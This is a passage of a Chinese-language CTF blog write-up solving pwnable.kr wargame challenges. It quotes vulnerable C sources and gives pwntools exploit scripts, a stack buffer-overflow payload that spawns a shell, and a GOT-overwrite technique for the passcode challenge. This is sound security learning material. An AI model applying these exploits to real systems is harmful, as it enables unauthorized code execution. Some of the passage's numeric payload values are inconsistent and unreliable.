class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;	<span class="comment">//比对的是16进制数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;	<span class="comment">//传入一个指向字符串的指针</span></span><br><span class="line">	<span class="type">int</span>* ip = (<span class="type">int</span>*)p;	<span class="comment">//转为int型 **注意这里变为了5个数组，具体看下面**</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];	<span class="comment">//将字符串中前5个字符的ascii值进行加和，得出结果res</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;	<span class="comment">//要求长度为20</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即输入的<code>password</code>参数必须是一个20位的、前5位加起来等于<code>0x21DD09EC</code>的字符串，这里注意一点，char型指针占用1个字节，而int型指针占用4个字节(一个int型变量位4个字节大小)，所以20个字符转为int型就是5个组。</p>
<p>我们先构造4个简单组：<code>"0x01010101" * 4</code>，一组的和是4，那么最后一个组的值就是<code>0x21DD09EC - 0x01010101*4 = 0x1DD905E8</code>，所以最终的payload为：<code>python -c "'\x01010101'*4 + '\x1DD905E8'" | ./col</code>。这里学着使用python的pwntools模块写最终的程序，后面都会这么写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;col&#x27;</span>, port = <span class="number">2222</span>, password = <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> pwn_ssh.connected()       <span class="comment">#连接成功判断</span></span><br><span class="line">post = pwn_ssh.process(argv = [<span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;\x01\x01\x01\x01&#x27;</span> * <span class="number">4</span> + <span class="string">&#x27;\xE8\x05\xD9\x1D&#x27;</span>], executable = <span class="string">&#x27;./col&#x27;</span>)      <span class="comment">#加载进程</span></span><br><span class="line"><span class="built_in">print</span> post.recvall()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行脚本就可以了(这个库的功能很丰富)：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221163039292.png" alt="image-20200221163039292" style="zoom:80%;" /></p>
<h2 id="bof">bof</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最基础的栈溢出题， 扔到IDA看一下func函数：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200221163940631.png"
alt="image-20200221163940631" />
<figcaption aria-hidden="true">image-20200221163940631</figcaption>
</figure>
<p>可以看到，overflowme变量的地址为栈底减去2CH，即44个字节，我们先得将这个数组溢出，去覆盖掉a1的值，之后才能绕过判断执行获得shell。</p>
<p>查看ida中的栈结构：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200221165207856.png"
alt="image-20200221165207856" />
<figcaption aria-hidden="true">image-20200221165207856</figcaption>
</figure>
<p>可以看到传入的形参key(这里就是arg_0)的位置为ebp+8的位置，而我们的数组的起始位置在ebp-2CH，所以要触摸到形参的其实地址，我们共需覆盖44+8=52字节的空间，然后再带上<code>0xcafebabe</code>，脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">52</span> + <span class="string">&#x27;\xbe\xba\xfe\xca&#x27;</span></span><br><span class="line">    result = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">    result.sendline(payload)</span><br><span class="line">    result.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221170609029.png" alt="image-20200221170609029" style="zoom: 80%;" /></p>
<h2 id="flag">flag</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure>
<p>这道题给了一个二进制文件，题目提示说明是一个逆向题，那就扔ida吧：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221191016261.png" alt="image-20200221191016261" style="zoom: 80%;" /></p>
<p>结构：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221195343416.png" alt="image-20200221195343416" style="zoom:80%;" /></p>
<p>查看hex数据，发现头部有UPX字段，可能进行了UPX加壳：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221195543744.png" alt="image-20200221195543744" style="zoom:80%;" /></p>
<p>使用upx工具解压：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221195631971.png" alt="image-20200221195631971" style="zoom:80%;" /></p>
<p>证实了有加壳的行为，再次用IDA查看，可以看到flag字段：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200221191128656.png"
alt="image-20200221191128656" />
<figcaption aria-hidden="true">image-20200221191128656</figcaption>
</figure>
<p>查看就是答案了：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200221202830619.png"
alt="image-20200221202830619" />
<figcaption aria-hidden="true">image-20200221202830619</figcaption>
</figure>
<h2 id="passcode">passcode</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> passcode1;</span><br><span class="line">	<span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);			<span class="comment">// &lt;------------</span></span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);	</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);		 <span class="comment">// &lt;------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);	<span class="comment">//这里对输入长度做了限制</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目里说的报错肯定就代码中我画箭头的地方了，应该使用<code>&amp;</code>来进行引用，<strong>如果没有用取地址符，程序会使用栈上的数据作为指针存放输入的数据</strong>：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221203638849.png" /></p>
<p>当然运行也会有错误，因为要写入的地址并不是一个合法的地址：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221203837216.png" /></p>
<p>那么我们的目标就是将这两个变量覆盖为相应的值即可。name数组大小有限，尝试溢出覆盖。扔进ida:</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221205037781.png" /></p>
<p>welcome函数中name数组大小起始位置为bp-70H，而passcode1的地址为bp-10H：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221205159157.png" /></p>
<p>这道题有一些比较重要的概念，这里就仔细分析下。</p>
<ul>
<li>问题一：main()函数中的name数组能覆盖到login函数中的变量吗？</li>
</ul>
<p>下面我写了一个简单的代码段，使用gdb-peda调试一下就知道了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">2</span>;		<span class="comment">//&lt;----此处设置断点</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;		<span class="comment">//&lt;----此处设置断点</span></span><br><span class="line">    hello();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221212215918.png" /></p>
<p>我这里栈底为<code>0x7fffffffdf70</code>，步入hello()函数：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221212612286.png" /></p>
<p>这里rbp发生了变化，栈底变为了原栈底向下增长20H的地H址空间(因为我设置了两个变量，每个变量16字节，这是内存对齐的原因，最小分配就是16字节10H)。</p>
<p>所以从这个实验来看的话，不同函数的栈底一般应该是不一样的。如是如此，这道题又怎么覆盖呢？</p>
<ul>
<li>问题二：这道题的栈基址在不同函数中也是一样的吗？</li>
</ul>
<p>我在main函数、welcome函数、login函数分别开头下了断点，分别查看一下他们的rbp值</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221215440404.png" /></p>
<p>这里main函数中栈底为<code>0x7fffffffded0</code>，步入函数welcome：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221215529254.png" /></p>
<p>welcome的栈底为<code>0x7fffffffdec0</code>，步出welcome，步入login：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221215702556.png" /></p>
<p>可以看到这里login函数的栈底依然是<code>0x7fffffffdec0</code>，这也就意味着，welcome函数中的name变量是可以覆盖到ogin函数中的变量的。</p>
<p>这两个变量使用的是同一个栈，所以二者的地址相差了70H-10H=60H，即96个字节，而name数组有100个字节大小，passcode1刚好是一个4字节的int型变量，那么这里可以先使用后四个字节覆盖passcode。</p>
<p>前面说到<strong>如果没有用取地址符，程序会使用栈上的数据作为指针存放输入的数据</strong>，前面程序的错误是因为没有引用符号，导致写入一个不可写入的地址，所以出错。那么这里我们可以将四字节改为一个<strong>可以写入的地址</strong>，那么去哪找可以写入的地址呢？</p>
<p><strong>这里有一个重要知识点：GOT表是可以写入的</strong>，什么是GOT表？即：<strong>全局偏移表</strong>（GOT,
Global Offset
Table），这个表常常于<strong>PLT表</strong>一起发挥动态链接的作用，具体查看这篇文章：https://www.zhihu.com/question/21249496。</p>
<p>那么我们思路就有了：使用name数组的后四个字节，将一个函数地址复写到passcode1变量，之后代码到了第一个scanf处时，将system函数的地址写进入，这样等调用fflush时，调用就变为了system函数了。</p>
<p>在IDA中查看GOT表(具体文件可以使用scp从pwnable上下载)：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221224551360.png" /></p>
<p>这里使用printf函数的地址<code>0x0804a000</code>(<strong>使用哪一个函数的地址都可以，没有区别，这里只是提供一个可写入的地址，你写入哪个函数地址，当执行到这个函数的时候就会执行</strong>)，此时paylaod为<code>"A"*96 + "\x00\xa0\x04\x08"</code>。然后再写入system函数地址<code>0x080485E3</code>，因为scanf的参数格式为%d，所以变为<code>134520848</code>，所以payload就变为了<code>"A"*96 + "\x00\xa0\x04\x08" + "134514147"</code>。这里没写脚本，因为有个00会导致阶段，暂时不知道怎么处理。</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221225951063.png" /></p>
<p>为了证实GOT表复写技术，我们再试试写入exit函数的地址，这次就会在调用exit函数时输出答案，exit函数的地址为<code>0x0804a018</code>：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221231854802.png" /></p>
<p>可以看到输出有<code>Login Failed！</code>字段，证实我们改变了代码执行的流程，将exit函数成功改为了system函数，最终成功cat了flag。</p>
<h2 id="random">random</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看一下man手册对rand()函数的描述：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">       The rand() function returns a pseudo-random integer in the range 0 to RAND_MAX inclusive (i.e., the mathematical range [0, RAND_MAX]).</span><br><span class="line">......</span><br><span class="line">If no seed value is provided, the rand() function is automatically seeded with a value of 1.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以rand函数生成的是一个伪随机序列，大小从0到RAND_MAX，没有设种子的情况下，自动设为1。<code>0xdeadbeef</code>的十进制值为<code>3735928559</code>。你可以写一个简单的c程序，调用rand()函数，并多次运行，可以发现第一个值一直是：<code>1804289383</code>，所以将这两个值进行异或就得出key值为<code>-1255736440</code>:</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222112817486.png" /></p>
<h2 id="input">input</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="type">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span 